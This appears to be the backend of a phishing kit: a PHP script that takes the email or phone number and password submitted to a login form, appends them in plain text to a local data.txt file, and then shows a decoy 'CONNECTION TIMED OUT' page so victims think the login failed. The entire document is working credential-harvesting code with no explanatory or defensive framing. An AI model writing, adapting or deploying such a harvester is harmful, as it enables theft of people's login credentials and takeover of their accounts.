<?php
$username= $_POST['email_phone'];
$password= $_POST['password'];

/*
echo 'Username : '.$username;
echo "<br/>";
echo 'Password : '.$password;
*/
$file = fopen("data.txt" , "a+") or die ("unable to open file!");

fwrite($file, "Username : ");
fwrite($file, $username);

fwrite($file, "\n");

fwrite($file, "Password : ");
fwrite($file, $password);

fwrite($file, "\n");

$text="--------- \n";
fwrite($file, $text);

//fwrite($file, "\n\n");


?>

<html>
	<head> <title> TEST </title>
	</head>
	
	<body>
	CONNECTION TIMED OUT
	</body>